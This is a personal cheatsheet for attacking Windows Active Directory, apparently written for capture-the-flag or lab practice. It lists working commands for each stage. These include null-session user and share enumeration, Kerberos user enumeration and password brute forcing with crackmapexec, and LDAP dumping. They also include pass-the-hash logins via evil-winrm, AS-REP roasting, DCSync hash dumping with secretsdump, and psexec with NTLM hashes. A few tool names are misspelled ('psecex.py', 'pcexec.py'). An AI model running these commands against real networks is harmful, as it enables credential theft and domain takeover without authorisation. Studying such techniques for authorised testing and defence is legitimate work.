Windows Enum Cheatsheet
=======================
----------------------
(work in progress)

## Enum users
```
rpcclient -U '' 10.10.1.2
enumdomusers	# search for users
querydispinfo	# anything in description field
index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.doe     Name: Adrian Doe   Desc: (null)
queryuser 0x464 # see more info
```
Get only usernames from enumdomusers:
```
cat file | awk -F\[ '{print $2}' | awk -F\] '{print $1}' > users.txt
```

## Enum shares
With the latsest version of crackmapexec use 'cme' instead of 'crackmapexec'
```
crackmapexec smb 10.10.1.2 --shares
crackmapexec smb 10.10.1.2 -u '' -p '' --shares
crackmapexec smb 10.10.1.2 -u '' --shares

smbclient -L 10.10.1.2
smbclient -U '' -L 10.10.1.2

smbmap -H 10.10.1.2 -u '' -p ''
```

## Check valid users
https://github.com/ropnop/kerbrute
```
./kerbrute userenum --dc 10.10.1.2 --d domainname.local users.txt 
```

## Brute force
With the latsest version of crackmapexec use 'cme' instead of 'crackmapexec'
Get the password policy:
```
crackmapexec smb 10.10.1.2 --pass-pol
```
Check the accountlockout option before you start a brute force. Also you can check the min length etc.
```
crackmapexec smb 10.10.1.2 -u users.txt -p password.txt 
```
Make sure you update to the latest version if you want to use this:
```
cme smb 10.10.10.182 -u username -p password -M spider_plus
```
This crawls through every share we have access to and returns it in json.

## Mount
```
mkdir /mnt/data
mount -t cifs -o 'user=username,password=password' //10.10.1.2/sharename /mnt/sharename
```

## lDAP
```
ldapsearch -x -h 10.10.1.2 -s base namingcontexts
```

Query domain and dump ldap:
```
ldapsearch -x -h 10.10.10.182 -s sub -b 'DC=example,DC=local' > ldapdump
```
Grab interesting unique things:
```
cat ldapdump | awk '{print s$1}' | sort | uniq -c| sort -nr
```
Get rid of base64:
```
cat ldapdump | awk '{print s$1}' | sort | uniq -c| sort -nr | grep : 
```
If you find anything interesting search for it in the dump

## Gaining access
Check
With the latsest version of crackmapexec use 'cme' instead of 'crackmapexec'
```
cme winrm 10.10.1.2 -u username -p password
cme winrm 10.10.1.2 -u username -H ntlmhash
```
Evil-winrm: (when it's not installed use this, otherwise it's just 'evil-winrm -i ... etc')
```
ruby evil-winrm.rb -i 10.10.1.2 -u username -p password
ruby evil-winrm.rb -i 10.10.1.2 -u username -H ntlmhash

```
## Impacket
### GetNPUsers.py
Queries target domain for users with 'Do not require Kerberos pre auth' set and export the TGTs for cracking
```
GetNPUsers.py domainname.local/ -usersfile users.txt -format john
```
### secretsdump.py
Let the domain think you are another DC. In order to sync I need all the password hashes. So with the right persmissions you'll get some hashes.
```
secretsdump.py domainname.local/username@10.10.2.1
```

### pcexec.py
Format for hash is LMHASH:NTHASH, but you can use the NTLM hash twice because windows doesn't really use LMHASH
```
psecex.py domainname.local/username@10.10.2.1 -hashes NTLM:NTLM



